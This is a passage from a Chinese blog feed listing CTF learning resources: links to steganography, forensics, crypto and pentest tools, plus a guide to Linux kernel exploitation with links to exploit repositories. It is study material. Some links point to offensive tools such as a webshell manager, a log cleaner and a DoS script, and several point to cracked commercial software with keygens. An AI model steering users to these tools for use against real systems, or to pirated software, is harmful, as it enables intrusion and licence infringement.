href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.outguess.org%2Fdownload.php" target="_blank" rel="noopener">http://www.outguess.org/download.php</a><br> Steghide–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsteghide.sourceforge.net%2Fdownload.php" target="_blank" rel="noopener">http://steghide.sourceforge.net/download.php</a><br> StegFS–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fstegfs%2F" target="_blank" rel="noopener">http://sourceforge.net/projects/stegfs/</a><br> pngcheck–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.libpng.org%2Fpub%2Fpng%2Fapps%2Fpngcheck.html" target="_blank" rel="noopener">http://www.libpng.org/pub/png/apps/pngcheck.html</a><br> GIMP–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gimp.org%2Fdownloads%2F" target="_blank" rel="noopener">http://www.gimp.org/downloads/</a><br> Audacity–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Faudacity.sourceforge.net%2Fdownload%2F" target="_blank" rel="noopener">http://audacity.sourceforge.net/download/</a><br> MP3Stego–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.petitcolas.net%2Fsteganography%2Fmp3stego%2F" target="_blank" rel="noopener">http://www.petitcolas.net/steganography/mp3stego/</a><br> ffmpeg(forvideoanalysis)–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ffmpeg.org%2Fdownload.html" target="_blank" rel="noopener">https://www.ffmpeg.org/download.html</a></p><p>电子取证:<br> dd–unix/linuxtool<br> strings–unix/linuxtool<br> scalpel–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsleuthkit%2Fscalpel" target="_blank" rel="noopener">https://github.com/sleuthkit/scalpel</a><br> TrID–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmark0.net%2Fsoft-trid-e.html" target="_blank" rel="noopener">http://mark0.net/soft-trid-e.html</a><br> binwalk–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fbinwalk.org%2F" target="_blank" rel="noopener">http://binwalk.org/</a><br> foremost–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fforemost.sourceforge.net%2F" target="_blank" rel="noopener">http://foremost.sourceforge.net/</a><br> ExifTool–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sno.phy.queensu.ca%2F~phil%2Fexiftool%2F" target="_blank" rel="noopener">http://www.sno.phy.queensu.ca/~phil/exiftool/</a><br> DigitalForensicsFramework(DFF)–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.digital-forensic.org%2Fdownload%2F" target="_blank" rel="noopener">http://www.digital-forensic.org/download/</a><br> ComputerAidedINvestigativeEnvironment(CAINE)Linuxforensicslivedistribution–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.caine-live.net%2F" target="_blank" rel="noopener">http://www.caine-live.net/</a><br> TheSleuthKit(TSK)–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sleuthkit.org%2Fsleuthkit%2Fdownload.php" target="_blank" rel="noopener">http://www.sleuthkit.org/sleuthkit/download.php</a><br> Volatility–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fvolatility%2F" target="_blank" rel="noopener">http://code.google.com/p/volatility/</a></p><p>编程以及编码工具/PPC:<br> Texteditors:<br> SublimeText–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sublimetext.com%2F" target="_blank" rel="noopener">http://www.sublimetext.com/</a><br> Notepad++–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnotepad-plus-plus.org%2F" target="_blank" rel="noopener">http://notepad-plus-plus.org/</a><br> vim–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vim.org%2F" target="_blank" rel="noopener">http://www.vim.org/</a><br> emacs–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Femacs%2F" target="_blank" rel="noopener">http://www.gnu.org/software/emacs/</a></p><p>密码学:<br> Cryptool–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cryptool.org%2F" target="_blank" rel="noopener">https://www.cryptool.org/</a><br> hashpump–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbwall%2FHashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a><br> Sage–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sagemath.org%2F" target="_blank" rel="noopener">http://www.sagemath.org/</a><br> JohntheRipper–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openwall.com%2Fjohn%2F" target="_blank" rel="noopener">http://www.openwall.com/john/</a><br> xortool–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhellman%2Fxortool" target="_blank" rel="noopener">https://github.com/hellman/xortool</a></p><p>在线工具:<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.crypo.com%2F" target="_blank" rel="noopener">http://www.crypo.com/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cryptool-online.org%2F" target="_blank" rel="noopener">http://www.cryptool-online.org/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/</a><br> Modulesforpython–pycrypto–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.dlitz.net%2Fsoftware%2Fpycrypto%2F" target="_blank" rel="noopener">https://www.dlitz.net/software/pycrypto/</a></p><p>cmd5:</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpmd5.com%2F" target="_blank" rel="noopener">http://pmd5.com/</a></p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com%2F" target="_blank" rel="noopener">http://www.cmd5.com/</a></p><p>进制转换-<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fhexconvert" target="_blank" rel="noopener">https://tool.lu/hexconvert</a></p><p>在线运行代码-<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc.runoob.com%2Fcompile%2F1" target="_blank" rel="noopener">https://c.runoob.com/compile/1</a><br> <strong>工具</strong><br> 秘迹：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fm.mijisou.com%2F" target="_blank" rel="noopener">https://m.mijisou.com/</a></p><p>在线病毒检测引擎：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.virscan.org%2F" target="_blank" rel="noopener">http://www.virscan.org/</a></p><p>云扫描病毒：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.scanvir.com%2F" target="_blank" rel="noopener">http://www.scanvir.com/</a></p><p>威胁情报分析平台：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fx.threatbook.cn%2Fpartner" target="_blank" rel="noopener">https://x.threatbook.cn/partner</a></p><p>WebShell检测引擎：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fscanner.baidu.com%2F" target="_blank" rel="noopener">https://scanner.baidu.com/</a></p><p>知道创宇：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fknownsec" target="_blank" rel="noopener">https://github.com/knownsec</a></p><p>Dm：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDm2333" target="_blank" rel="noopener">https://github.com/Dm2333</a></p><p>EventCleaner：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2F360-A-Team%2FEventCleaner" target="_blank" rel="noopener">https://github.com/360-A-Team/EventCleaner</a></p><p>验证码识别库：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wzdr.cn%2Farticle-534.html" target="_blank" rel="noopener">http://www.wzdr.cn/article-534.html</a></p><p>中国特色弱口令生成器：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRicterZ%2FgenpAss" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss</a></p><p>MSDN各种工具和服务器镜像：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmsdn.itellyou.cn%2F" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><p>C32asm最佳的静态反汇编软件：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.c32asm.com%2F" target="_blank" rel="noopener">http://www.c32asm.com/</a></p><p>PHP在线加解密网站：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhaoyuanma.com%2F" target="_blank" rel="noopener">http://www.zhaoyuanma.com/</a></p><p>K8工具合集：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><p>WinAFL模糊测试工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fivanfratric%2Fwinafl" target="_blank" rel="noopener">https://github.com/ivanfratric/winafl</a></p><p>异步目标枚举工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwelchbj%2Fbscan" target="_blank" rel="noopener">https://github.com/welchbj/bscan</a></p><p>开源扫描仪工具箱：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FWe5ter%2FScanners-Box" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box</a></p><p>FCN：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fboywhp%2Ffcn" target="_blank" rel="noopener">https://github.com/boywhp/fcn</a></p><p>浏览器的PWN：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fm1ghtym0%2Fbrowser-pwn" target="_blank" rel="noopener">https://github.com/m1ghtym0/browser-pwn</a></p><p>高级威胁战术：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cobaltstrike.com%2Ftraining" target="_blank" rel="noopener">https://www.cobaltstrike.com/training</a></p><p>风控预警平台：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fcreditease-sec%2Finsight" target="_blank" rel="noopener">https://github.com/creditease-sec/insight</a></p><p>暴力破解工具Hydra（九头蛇）：</p><p><a href="https://www.jianshu.com/p/e02ef0a00786" target="_blank" rel="noopener">https://www.jianshu.com/p/e02ef0a00786</a></p><p>万能密码字典：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwenku.baidu.com%2Fview%2Fd55f60e4c281e53a5902ff0d" target="_blank" rel="noopener">https://wenku.baidu.com/view/d55f60e4c281e53a5902ff0d</a></p><p>SubFinder是一个子域发现工具：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsubfinder%2Fsubfinder" target="_blank" rel="noopener">https://github.com/subfinder/subfinder</a></p><p>中国蚂剑：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FantSword%2Freleases" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword/releases</a></p><p>Windows-Exploit-Suggester：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FGDSSecurity%2FWindows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>构造优质上传漏洞fuzz字典：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2Farticles%2F2018%2Fmake-upload-vul-fuzz-dic%2F" target="_blank" rel="noopener">http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p><p>一款识别图形验证码的BurpSuite插件：</p><p><a href="https://www.jianshu.com/p/a0262883b751" target="_blank" rel="noopener">https://www.jianshu.com/p/a0262883b751</a></p><p>slowloris.py-Python中的简单slowloris：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgkbrk%2Fslowloris" target="_blank" rel="noopener">https://github.com/gkbrk/slowloris</a></p><p>SharpSploit控制台：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fanthemtotheego%2FSharpSploitConsole" target="_blank" rel="noopener">https://github.com/anthemtotheego/SharpSploitConsole</a></p><p>研究个人编译APT恶意软件：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsapphirex00%2FThreat-Hunting" target="_blank" rel="noopener">https://github.com/sapphirex00/Threat-Hunting</a></p><p>代理行动规则：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPortSwigger%2Fproxy-action-rules" target="_blank" rel="noopener">https://github.com/PortSwigger/proxy-action-rules</a></p><p>SwitchHosts—快速切换主机：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Foldj%2FSwitchHosts" target="_blank" rel="noopener">https://github.com/oldj/SwitchHosts</a></p><p>Xshell6.0破解版本（绿色破解）：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fqq_32589267%2F10792860" target="_blank" rel="noopener">https://download.csdn.net/download/qq_32589267/10792860</a></p><p>BurpSuite破解版（含注册机，无后门）：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fu014549283%2Farticle%2Fdetails%2F81248886" target="_blank" rel="noopener">https://blog.csdn.net/u014549283/article/details/81248886</a></p><p>x-pack-core-6.4.2破解版亲测可用：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fczs208112%2F10718181" target="_blank" rel="noopener">https://download.csdn.net/download/czs208112/10718181</a></p><p>Wiki收集RedTeam基础架构强化资源：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbluscreenofjeff%2FRed-Team-Infrastructure-Wiki" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p>应急响应工具大合集：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fmeirwah%2Fawesome-incident-response" target="_blank" rel="noopener">https://github.com/meirwah/awesome-incident-response</a></p><p>蜜罐：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fparalax%2Fawesome-honeypots%2Fblob%2Fmaster%2FREADME_CN.md" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md</a></p><p>电子书籍：</p><p>安全思维导图集合：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2Fsec-chart" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart</a><br> PHP编程：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1ZvUdonJ_h3EYTfHIbjoe6A" target="_blank" rel="noopener">https://pan.baidu.com/s/1ZvUdonJ_h3EYTfHIbjoe6A</a><br> 代码审计入门：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnblogs.com%2FOran9e%2Fp%2F7763751.html" target="_blank" rel="noopener">http://www.cnblogs.com/Oran9e/p/7763751.html</a><br> 墨者学院审计类通关指南：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2821" target="_blank" rel="noopener">https://xz.aliyun.com/t/2821</a><br> IT畅销电子书：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.packtpub.com%2F" target="_blank" rel="noopener">https://www.packtpub.com/</a></p><p>资源网站：<br> KaliLinux渗透测试：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8UcU7R803k3gcextswzGlQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8UcU7R803k3gcextswzGlQ</a><br> Oday安全：<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daysecurity.com%2Fpenetration-testing%2Fenumeration.html" target="_blank" rel="noopener">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br> IT资料搜寻网站：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.programcreek.com%2Fjava-api-examples%2F%3Faction%3Dsearch" target="_blank" rel="noopener">https://www.programcreek.com/java-api-examples/?action=search</a><br> web安全基础（解压密码：xindong）：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1xyAXrQceq9bUzfBrYc4bBA" target="_blank" rel="noopener">https://pan.baidu.com/s/1xyAXrQceq9bUzfBrYc4bBA</a></p><p>其它知识点：<br> Poc基础知识：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html" target="_blank" rel="noopener">https://poc.evalbug.com/chapter1/1.html</a><br> 对CDN的误区：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.rinige.com%2Findex.php%2Farchives%2F772%2F" target="_blank" rel="noopener">http://www.rinige.com/index.php/archives/772/</a><br> 同时部署WAF和CDN：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fhelp.aliyun.com%2Fknowledge_detail%2F42200.html" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/42200.html</a><br> Linux系统清除缓存【整理】：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqiuzhi__ke%2Farticle%2Fdetails%2F70768544" target="_blank" rel="noopener">https://blog.csdn.net/qiuzhi__ke/article/details/70768544</a><br> 大马小马的区别：<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnhonkerarmy.com%2Fthread-156156-1-1.html" target="_blank" rel="noopener">http://www.cnhonkerarmy.com/thread-156156-1-1.html</a><br> 面试必备之乐观锁与悲观锁：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_34337272%2Farticle%2Fdetails%2F81072874" target="_blank" rel="noopener">https://blog.csdn.net/qq_34337272/article/details/81072874</a><br> 一套实用的渗透测试岗位面试题：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25582026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25582026</a><br> IPC<img src="https://math.jianshu.com/math?formula=%E3%80%81ADMIN" alt="、ADMIN">)、C<img src="https://math.jianshu.com/math?formula=%E3%80%81D" alt="、D">是什么?如何关闭删除Windows默认共享：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fm.jb51.net%2Fsoftjc%2F2124.html" target="_blank" rel="noopener">https://m.jb51.net/softjc/2124.html</a><br> php下进行mysql参数化查询：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Flpwmm%2Farticle%2Fdetails%2F50733698" target="_blank" rel="noopener">https://blog.csdn.net/lpwmm/article/details/50733698</a></p><p>闲趣文章：</p><p>2018中国白帽人才调查报告：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F170034" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170034</a></p><p>如何走进黑客世界：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fneopoints%2F190895.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/neopoints/190895.html</a></p><p>网络安全行业全景图：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FgksuSM7S-MLZ5LFz6-kjdw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gksuSM7S-MLZ5LFz6-kjdw</a></p><h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><p>进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。</p><h3 id="Interactive-map-of-Linux-kernel"><a href="#Interactive-map-of-Linux-kernel" class="headerlink" title="Interactive map of Linux kernel"></a>Interactive map of Linux kernel</h3><p><a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">http://www.makelinux.net/kernel_map/</a></p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani"><a href="#《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani" class="headerlink" title="《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani"></a>《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani</h3><p><a href="http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8" target="_blank" rel="noopener">http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8</a></p><h3 id="《Linux-Kernel-Architecture》，Wolfgang-Mauerer"><a href="#《Linux-Kernel-Architecture》，Wolfgang-Mauerer" class="headerlink" title="《Linux Kernel Architecture》，Wolfgang Mauerer"></a>《Linux Kernel Architecture》，Wolfgang Mauerer</h3><p><a href="http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79" target="_blank" rel="noopener">http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79</a></p><h3 id="《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds"><a href="#《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds" class="headerlink" title="《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds"></a>《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds</h3><p><a href="http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC" target="_blank" rel="noopener">http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC</a></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="Linux内核源码"><a href="#Linux内核源码" class="headerlink" title="Linux内核源码"></a>Linux内核源码</h3><p><a href="https://github.com/torvalds/linux" target="_blank" rel="noopener">https://github.com/torvalds/linux</a></p><h3 id="Linux各版本内核"><a href="#Linux各版本内核" class="headerlink" title="Linux各版本内核"></a>Linux各版本内核</h3><p><a href="https://www.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://www.kernel.org/pub/linux/kernel/</a></p><h3 id="Linux内核代码在线查看"><a href="#Linux内核代码在线查看" class="headerlink" title="Linux内核代码在线查看"></a>Linux内核代码在线查看</h3><p><a href="http://lxr.free-electrons.com/" target="_blank" rel="noopener">http://lxr.free-electrons.com</a></p><h2 id="exp及分析文章"><a href="#exp及分析文章" class="headerlink" title="exp及分析文章"></a>exp及分析文章</h2><h3 id="linux-kernel-exploits"><a href="#linux-kernel-exploits" class="headerlink" title="linux-kernel-exploits"></a>linux-kernel-exploits</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p><h3 id="kernel-exploit"><a href="#kernel-exploit" class="headerlink" title="kernel exploit"></a>kernel exploit</h3><p><a href="https://github.com/lucyoa/kernel-exploits" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits</a></p><h3 id="kernel-heap-overflow利用"><a href="#kernel-heap-overflow利用" class="headerlink" title="kernel heap overflow利用"></a>kernel heap overflow利用</h3><p><a href="https://zhuanlan.zhihu.com/p/26674557" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26674557</a></p><h3 id="kernel-exploit-适合入门"><a href="#kernel-exploit-适合入门" class="headerlink" title="kernel exploit(适合入门)"></a>kernel exploit(适合入门)</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf</a></p><h3 id="blackhat-kernel议题"><a href="#blackhat-kernel议题" class="headerlink" title="blackhat kernel议题"></a>blackhat kernel议题</h3><p><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf</a></p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h3 id="syzkaller"><a href="#syzkaller" class="headerlink" title="syzkaller"></a>syzkaller</h3><p>这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境<br><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><h3 id="Awesome-Fuzzing"><a href="#Awesome-Fuzzing" class="headerlink" title="Awesome-Fuzzing"></a>Awesome-Fuzzing</h3><p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="x86-64-Assembly"><a href="#x86-64-Assembly" class="headerlink" title="x86_64 Assembly"></a>x86_64 Assembly</h3><p><a href="https://0xax.github.io/categories/assembler/" target="_blank" rel="noopener">https://0xax.github.io/categories/assembler/</a></p><h3 id="64-bit-system-call-numbers-and-entry-vectors"><a href="#64-bit-system-call-numbers-and-entry-vectors" class="headerlink" title="64-bit system call numbers and entry vectors"></a>64-bit system call numbers and entry vectors</h3><p><a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p><h3 id="翻过的文章记录"><a href="#翻过的文章记录" class="headerlink" title="翻过的文章记录"></a>翻过的文章记录</h3><p>深入理解linux系统下proc文件系统内容<br><a href="http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html" target="_blank" rel="noopener">http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html</a><br>What is mode_t in C?<br><a href="https://jameshfisher.com/2017/02/24/what-is-mode_t.html" target="_blank" rel="noopener">https://jameshfisher.com/2017/02/24/what-is-mode_t.html</a><br>Understanding a Kernel Oops!<br><a href="http://opensourceforu.com/2011/01/understanding-a-kernel-oops/" target="_blank" rel="noopener">http://opensourceforu.com/2011/01/understanding-a-kernel-oops/</a><br>Linux Kernel Procfs Guide<br><a href="https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf">https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf</a><br>用户空间与内核空间数据交换的方式(2)——procfs<br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html" target="_blank" rel="noopener">http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html</a><br>用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user<br><a href="http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html" target="_blank" rel="noopener">http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html</a><br>谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”<br><a href="https://blog.csdn.net/comwise/article/details/9087279" target="_blank" rel="noopener">https://blog.csdn.net/comwise/article/details/9087279</a><br>Root exploit for Android and Linux（CVE-2010-4258）<br><a href="https://blog.csdn.net/hu3167343/article/details/36892563" target="_blank" rel="noopener">https://blog.csdn.net/hu3167343/article/details/36892563</a></p><p>思维导图：</p><p><img src="https://img-blog.csdnimg.cn/20190728162957829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RSb25kb25n,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CTF-学习资料整理&quot;&gt;&lt;a href=&quot;#CTF-学习资料整理&quot; class=&quot;headerlink&quot; title=&quot;CTF 学习资料整理&quot;&gt;&lt;/a&gt;CTF 学习资料整理&lt;/h2&gt;&lt;p&gt;多个地方转载整理：&lt;/p&gt;
&lt;p&gt;php代码解密&lt;a href=&quot;https
      
    
    </summary>
    
    
      <category term="ctf" scheme="http://www.yorzorzy.xyz/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://www.yorzorzy.xyz/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch基本原理介绍</title>
    <link href="http://www.yorzorzy.xyz/2020/02/10/es%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/"/>
    <id>http://www.yorzorzy.xyz/2020/02/10/es%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-02-10T01:59:02.217Z</published>
    <updated>2020-02-10T01:57:41.000Z</updated>
    
